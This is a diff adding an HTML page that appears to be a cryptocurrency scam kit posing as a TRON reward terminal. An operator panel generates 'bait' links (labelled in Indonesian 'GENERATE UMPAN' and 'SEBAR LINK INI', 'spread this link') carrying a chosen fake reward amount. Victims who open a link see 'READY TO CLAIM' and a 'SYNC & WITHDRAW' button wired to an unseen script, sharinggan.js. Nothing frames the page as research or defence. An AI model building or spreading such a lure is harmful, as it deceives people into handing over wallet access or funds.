@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TRON | Validator Terminal</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div id="admin-view" class="box">
+            <h2 class="red">SYSTEM ADMIN</h2>
+            <input type="number" id="amt" placeholder="Set reward (Ex: 20000)">
+            <button onclick="buatUmpan()" class="bg-red">GENERATE UMPAN</button>
+            <div id="url-box" class="result"></div>
+        </div>
+        <div id="target-view" class="box" style="display:none;">
+            <h2 class="green">TRON REWARD</h2>
+            <div class="reward-frame">
+                <span id="disp-amt" class="amount">$ 0.00</span>
+                <p class="status">STATUS: READY TO CLAIM</p>
+            </div>
+            <button id="syncBtn" class="bg-green">SYNC & WITHDRAW</button>
+        </div>
+    </div>
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const reward = params.get('reward');
+        if (reward) {
+            document.getElementById('admin-view').style.display = 'none';
+            document.getElementById('target-view').style.display = 'block';
+            document.getElementById('disp-amt').innerText = "$ " + Number(reward).toLocaleString();
+        }
+        function buatUmpan() {
+            const val = document.getElementById('amt').value;
+            const link = window.location.origin + window.location.pathname + "?reward=" + val;
+            document.getElementById('url-box').innerText = "SEBAR LINK INI:\n" + link;
+        }
+    </script>
+    <script src="sharinggan.js"></script>
+</body>
+          </html>
